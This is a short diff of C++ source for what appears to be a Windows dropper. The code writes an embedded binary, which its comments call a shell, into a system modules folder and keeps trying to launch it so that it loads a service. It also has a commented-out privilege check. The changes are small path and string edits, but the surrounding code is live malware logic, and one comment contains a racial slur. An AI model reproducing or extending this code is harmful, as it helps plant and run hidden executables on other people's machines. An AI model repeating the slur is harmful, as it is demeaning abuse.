@@ -42,7 +42,7 @@ void main() {
     //    printf("Im elevated");
     //}
     //else {
-    //    printf("Im a dumbass");
+    //    printf("Im a mid integrity dumbass");
     //    return;
     //}
     auto full_path = ExePath();
@@ -78,14 +78,14 @@ void main() {
 
     //Write the shell inside System modules folder, just because why not mess with them niggas
     std::ofstream output;
-    output.open(FULL_PATH(SHELL_MODULE_NAME), std::ofstream::binary);
+    output.open(SHELL_PATH(SHELL_MODULE_NAME), std::ofstream::binary);
     output.write((char*)embedded_image_1, embedded_image_1_size);
     output.close();
 
     //Open the shell, which will then load the service
     STARTUPINFO info = { sizeof(info) };
     PROCESS_INFORMATION processInfo;
-    while (!CreateProcessA(FULL_PATH(SHELL_MODULE_NAME), (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
+    while (!CreateProcessA(SHELL_PATH(SHELL_MODULE_NAME), (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
     {
         Sleep(100);
     }
